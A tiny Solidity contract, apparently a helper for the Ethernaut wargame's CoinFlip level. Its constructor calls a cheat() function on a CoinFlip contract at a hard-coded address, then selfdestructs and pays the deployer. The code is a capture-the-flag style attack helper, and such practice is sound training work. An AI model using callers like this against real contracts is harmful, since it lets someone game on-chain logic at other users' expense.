// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "../ethernaut/3-coinflip.sol";
address constant cheaterContract = 0xAC89a249e6148FEbFB045e49fcb875BAD918EDd2;

contract Caller {
    constructor() payable  {
        CoinFlip(cheaterContract).cheat();
        selfdestruct(payable(msg.sender));
    }
}